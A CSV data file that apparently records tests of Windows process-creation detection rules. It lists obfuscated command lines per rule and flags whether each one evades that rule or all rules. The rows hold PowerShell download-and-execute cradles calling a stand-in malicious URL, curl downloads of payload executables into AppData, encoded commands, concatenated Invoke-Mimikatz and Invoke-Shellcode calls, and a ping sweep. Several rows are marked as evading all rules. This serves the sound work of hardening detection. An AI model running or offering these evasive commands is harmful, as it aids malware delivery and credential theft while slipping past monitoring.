Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1059,proc_creation_win_winget_add_insecure_custom_source,Add Insecure Download Source To Winget,81a0ecb5-0a41-4ba1-b2ba-c944eb92bfa2,,"powershell.exe -c ""$cmd='winget.exe'; $args=@('"" source""', '""add""' , '-n' , 'test' , '""http://10.10.10.10""' ); & $cmd $args""",TRUE,TRUE,TRUE,
t1059,proc_creation_win_winget_add_insecure_custom_source,Add Insecure Download Source To Winget,81a0ecb5-0a41-4ba1-b2ba-c944eb92bfa2,,"powershell.exe -Command ""$cmd='winget.exe'; $args=@('"" source""', '""add""' , '-n' , 'test' , '""http://10.10.10.10""' ); & $cmd $args""",TRUE,TRUE,TRUE,
t1059,proc_creation_win_vmware_vmtoolsd_susp_child_process,VMToolsd Suspicious Child Process,5687f942-867b-4578-ade7-1e341c46e99a,,"cmd.exe /c ""REM \VMware\VMware Tools\poweron-vm-default.bat && calc.exe""",TRUE,TRUE,TRUE,
t1059,proc_creation_win_susp_network_scan_loop,Suspicious Scan Loop Network,f8ad2e2c-40b6-4117-84d7-20b89896ab23,,"cmd.exe /c ""f^o^r /L %i in (1,1,254) do p^i^n^g -n 1 192.168.1.%i""",TRUE,TRUE,TRUE,
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe /""c"" ""iex ('Invoke-' + 'Shell' + 'code')""",TRUE,TRUE,TRUE,
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nOprOfIle /""NonInteractive"" -ep Bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",TRUE,TRUE,FALSE,PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /""NoProfile"" -NonInteractive -EXEcuTionPOLIcY Bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",TRUE,TRUE,FALSE,PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /""NoProfile"" -""NonInteractive"" -ep Bypass -cOmmAnD ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",TRUE,TRUE,FALSE,PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noproFiLE /""NonInteractive"" -ep Bypass -CoMmaND ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",TRUE,TRUE,FALSE,PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -""NonInteractive"" -exECutIOnPOLicy Bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",TRUE,TRUE,FALSE,PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,powershell.exe -EncodedCommand JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz,TRUE,TRUE,FALSE,Suspicious Encoded PowerShell Command Line (ca2092a1-c273-4878-9b4b-0d60115bf5ea); Suspicious PowerShell Encoded Command Patterns (b9d9cc83-380b-4ba3-8d8f-60c0e7e2930c); Suspicious Execution of Powershell with Base64 (fb843269-508c-4b76-8b8d-88679db22ce7)
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,powershell.exe -enc JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz,TRUE,TRUE,FALSE,Suspicious Encoded PowerShell Command Line (ca2092a1-c273-4878-9b4b-0d60115bf5ea); Suspicious PowerShell Encoded Command Patterns (b9d9cc83-380b-4ba3-8d8f-60c0e7e2930c); Suspicious Execution of Powershell with Base64 (fb843269-508c-4b76-8b8d-88679db22ce7)
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,powershell.exe -ENcodEDCOMManD JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz,TRUE,TRUE,FALSE,Suspicious Encoded PowerShell Command Line (ca2092a1-c273-4878-9b4b-0d60115bf5ea); Suspicious PowerShell Encoded Command Patterns (b9d9cc83-380b-4ba3-8d8f-60c0e7e2930c); Suspicious Execution of Powershell with Base64 (fb843269-508c-4b76-8b8d-88679db22ce7)
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe /""EncodedCommand"" JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz",TRUE,TRUE,TRUE,
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe /""Command"" ""& { $k = 'Invoke-'; $m = 'Mimikatz'; Invoke-Expression ($k + $m) }""",TRUE,TRUE,FALSE,HackTool - Mimikatz Execution (a642964e-bead-4bed-8910-1bb4d63e3b4d); HackTool - Mimikatz Execution (a642964e-bead-4bed-8910-1bb4d63e3b4d)
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe /""Command"" ""[scriptblock]::Create('In' + 'voke-Mimikatz').Invoke()""",TRUE,TRUE,FALSE,HackTool - Mimikatz Execution (a642964e-bead-4bed-8910-1bb4d63e3b4d); HackTool - Mimikatz Execution (a642964e-bead-4bed-8910-1bb4d63e3b4d)
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA,TRUE,TRUE,FALSE,PowerShell Base64 Encoded Invoke Keyword (6385697e-9f1b-40bd-8817-f4a91f40508e); Suspicious Execution of Powershell with Base64 (fb843269-508c-4b76-8b8d-88679db22ce7)
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,powershell.exe -enc SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA,TRUE,TRUE,FALSE,PowerShell Base64 Encoded Invoke Keyword (6385697e-9f1b-40bd-8817-f4a91f40508e); Suspicious Execution of Powershell with Base64 (fb843269-508c-4b76-8b8d-88679db22ce7)
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,powershell.exe -EncodeDcommANd SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA,TRUE,TRUE,FALSE,PowerShell Base64 Encoded Invoke Keyword (6385697e-9f1b-40bd-8817-f4a91f40508e); Suspicious Execution of Powershell with Base64 (fb843269-508c-4b76-8b8d-88679db22ce7)
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,powershell.exe -eNcoDedcoMmAND SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA,TRUE,TRUE,FALSE,PowerShell Base64 Encoded Invoke Keyword (6385697e-9f1b-40bd-8817-f4a91f40508e); Suspicious Execution of Powershell with Base64 (fb843269-508c-4b76-8b8d-88679db22ce7)
t1059,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe /""Command"" ""$part1 = 'Invoke-'; $part2 = 'Mimikatz'; $cmd = $part1 + $part2; iex $cmd""",TRUE,TRUE,FALSE,HackTool - Mimikatz Execution (a642964e-bead-4bed-8910-1bb4d63e3b4d); HackTool - Mimikatz Execution (a642964e-bead-4bed-8910-1bb4d63e3b4d)
t1059,proc_creation_win_susp_gather_network_info_execution,Suspicious Reconnaissance Activity Via GatherNetworkInfo.VBS,07aa184a-870d-413d-893a-157f317f6f58,,"cmd.exe /c ""set str1=gather & set str2=NetworkInfo.vbs & call wscript.exe C:\Windows\System32\%str1%%str2%""",TRUE,TRUE,TRUE,
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl -o %A^ppData%\test.exe h^t^t^p://[example.com/test.exe]()""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl -o %A^ppData%\test.exe h^t^t^p://[example.com/test.exe]()""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -""Command"" ""Invoke-WebRequest -Uri 'http://example.com/test.exe' -OutFile $env:APPDATA\test.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe /""Command"" ""Invoke-WebRequest -Uri 'http://example.com/test.exe' -OutFile $env:APPDATA\test.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\file.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\file.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\AppData\Roaming\file.exe&& call curl %protocol%%url% -o %dest%""",TRUE,TRUE,FALSE,Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\AppData\Roaming\file.exe&& call curl %protocol%%url% -o %dest%""",TRUE,TRUE,FALSE,Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe /""Command"" ""Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile $env:APPDATA\payload.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl http://example.com/payload.exe -o %USERPROFILE%\AppData\Roaming\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl http://example.com/payload.exe -o %USERPROFILE%\AppData\Roaming\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl http://example.local/test.txt -o C:\Users\Public\AppData\Roaming\test.txt""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl http://example.local/test.txt -o C:\Users\Public\AppData\Roaming\test.txt""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""set A=App&& set D=Data&& cmd /c curl h^ttp://example.local/test.txt -o %USERPROFILE%\%A%%D%\Roaming\test.txt""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /V:ON /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /V:oN /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /v:on /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /""V:ON"" /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.003,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /v:ON /C ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
